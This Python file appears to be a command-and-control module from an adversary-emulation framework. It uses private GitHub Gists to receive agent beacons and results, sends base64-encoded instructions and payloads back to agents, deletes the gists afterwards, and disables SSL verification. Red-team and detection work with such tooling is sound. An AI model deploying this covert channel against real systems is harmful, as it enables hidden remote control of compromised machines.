import aiohttp
import asyncio
import json
import re
import uuid

from base64 import b64encode

from app.utility.base_world import BaseWorld


class Gist(BaseWorld):

    def __init__(self, services):
        self.name = 'gist'
        self.description = 'Use gist for C2'
        self.file_svc = services.get('file_svc')
        self.contact_svc = services.get('contact_svc')
        self.log = self.create_logger('contact_gist')
        self.key = ""

    async def start(self):
        if await self.valid_config():
            self.key = self.get_config('app.contact.gist')
            loop = asyncio.get_event_loop()
            loop.create_task(self.gist_operation_loop())

    async def gist_operation_loop(self):
        while True:
            await self.handle_results(await self.get_results())
            await self.handle_beacons(await self.get_beacons())
            await asyncio.sleep(15)

    async def valid_config(self):
        return re.compile(pattern='[a-zA-Z0-9]{40,40}').match(self.get_config('app.contact.gist'))

    async def handle_results(self, results):
        """
        handle results data
        """
        for data in results:
            await self.contact_svc.save_results(data['id'], data['output'], data['status'], data['pid'])

    async def handle_beacons(self, beacons):
        """
        handle beacons from agents
        """
        for beacon in beacons:
            try:
                profile = json.loads(self.decode_bytes(beacon.get('profile')))
                profile['paw'] = profile.get('paw')
                profile['contact'] = self.name
                agent, instructions = await self.contact_svc.handle_heartbeat(**beacon)
                await self._send_instructions(agent, beacon, instructions)
            except Exception as e:
                print(e)

    async def get_results(self):
        """
        Retrieve all GIST posted results for a this C2's api key
        :return:
        """
        try:
            results = await self._get_raw_gist_urls(comm_type='results')
            result_content = await self._get_gist_content([result[0] for result in results])
            await self._delete_gists([result[1] for result in results])
            return result_content
        except Exception:
            self.log.debug('Retrieving results over c2 (%s) failed!' % self.__class__.__name__)
            return []

    async def get_beacons(self):
        """
        Retrieve all GIST beacons for a particular api key
        :return: the beacons
        """
        try:
            beacons = await self._get_raw_gist_urls(comm_type='beacon')
            beacon_content = await self._get_gist_content([beacon[0] for beacon in beacons])
            await self._delete_gists([beacon[1] for beacon in beacons])
            return beacon_content
        except Exception:
            self.log.debug('Receiving beacons over c2 (%s) failed!' % self.__class__.__name__)
            return []

    async def post_payloads(self, payloads, paw):
        """
        Given a list of payloads and an agent paw, posts the payloads as a series of base64 encoded
        files as individual gists
        :param payloads:
        :param paw:
        :return:
        """
        try:
            for p in payloads:
                file = {p[0]: dict(content=self._encode_string(p[1]))}
                if await self._wait_for_paw(paw, comm_type='payloads'):
                    break
                gist = self._build_gist_content(comm_type='payloads', paw='{}-{}'.format(paw, p[0]), file=file)
                data = await self._post_gist(gist)
            return
        except Exception as e:
            self.log.warning('Posting payload over c2 (%s) failed! %s' % (self.__class__.__name__, e))

    async def post_instructions(self, text, paw):
        """
        Post an instruction for the agent to execute as an encoded GIST
        :param text: The instruction text for the agent to execute
        :param paw: The paw for the agent to execute
        :return:
        """
        try:
            if len(json.loads(self.file_svc.decode_bytes(text))['instructions']) < 1 or \
                    await self._wait_for_paw(paw, comm_type='instructions'):
                return
            gist = self._build_gist_content(comm_type='instructions', paw=paw,
                                            file={str(uuid.uuid4()): dict(content=text)})
            return await self._post_gist(gist)
        except Exception:
            self.log.warning('Posting instructions over c2 (%s) failed!' % self.__class__.__name__)

    """ PRIVATE """

    async def _post_gist(self, gist):
        headers = dict(Authorization='token {}'.format(self.key))
        async with aiohttp.ClientSession(headers=headers, connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
            return await self._post(session, 'https://api.github.com/gists', body=gist)

    @staticmethod
    def _build_gist_content(comm_type, paw, file):
        return dict(description='{}-{}'.format(comm_type, paw), public=False, file=file)

    async def _get_gist_content(self, urls):
        all_content = []
        headers = dict(Authorization='token {}'.format(self.key))
        for url in urls:
            all_content.append(await self._fetch_content(url, headers))
        return all_content

    async def _fetch_content(self, url, headers):
        async with aiohttp.ClientSession(headers=headers, connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
            return json.loads(self.file_svc.decode_bytes(await self._fetch(session, url)))

    async def _get_raw_gist_urls(self, comm_type):
        raw_urls = []
        for gist in await self._get_gists():
            if comm_type in gist['description']:
                for file in gist.get('files'):
                    raw_url = gist['files'][file]['raw_url']
                    raw_urls.append((raw_url, gist['id']))
        return raw_urls

    async def _get_gists(self):
        headers = dict(Authorization='token {}'.format(self.key))
        async with aiohttp.ClientSession(headers=headers, connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
            return json.loads(await self._fetch(session, 'https://api.github.com/gists'))

    async def _delete_gists(self, gist_ids):
        headers = dict(Authorization='token {}'.format(self.key))
        for _id in gist_ids:
            async with aiohttp.ClientSession(headers=headers,
                                             connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
                await self._delete(session, 'https://api.github.com/gists/{}'.format(_id))

    @staticmethod
    async def _fetch(session, url):
        async with session.get(url) as response:
            return await response.text()

    @staticmethod
    async def _post(session, url, body):
        async with session.post(url, json=body) as response:
            return await response.text()

    async def _wait_for_paw(self, paw, comm_type):
        for gist in await self._get_gists():
            if '{}-{}'.format(comm_type, paw) == gist['description']:
                return True
        return False

    @staticmethod
    async def _delete(session, url):
        async with session.delete(url) as response:
            return await response.text('ISO-8859-1')

    async def _send_instructions(self, agent, beacon, instructions):
        payloads = self._get_payloads(instructions)
        payload_contents = await self._get_payload_content(payloads, beacon)
        await self.post_payloads(payload_contents, beacon['paw'])
        response = dict(paw=agent.paw,
                        sleep=await agent.calculate_sleep(),
                        watchdog=agent.watchdog,
                        instructions=json.dumps([json.dumps(i.display) for i in instructions]))
        text = self._encode_string(json.dumps(response).encode('utf-8'))
        await self.post_instructions(text, beacon['paw'])

    @staticmethod
    def _get_payloads(instructions):
        list_instructions = json.loads(instructions)
        return [json.loads(instruction).get('payload') for instruction in list_instructions
                if json.loads(instruction).get('payload')]

    async def _get_payload_content(self, payloads, beacon):
        payload_content = []
        for p in payloads:
            if p in self.file_svc.special_payloads:
                f = await self.file_svc.special_payloads[p](dict(file=p, platform=beacon['platform']))
                payload_content.append(await self.file_svc.read_file(f))
            else:
                payload_content.append(await self.file_svc.read_file(p))
        return payload_content

    @staticmethod
    def _encode_string(s):
        return str(b64encode(s), 'utf-8')
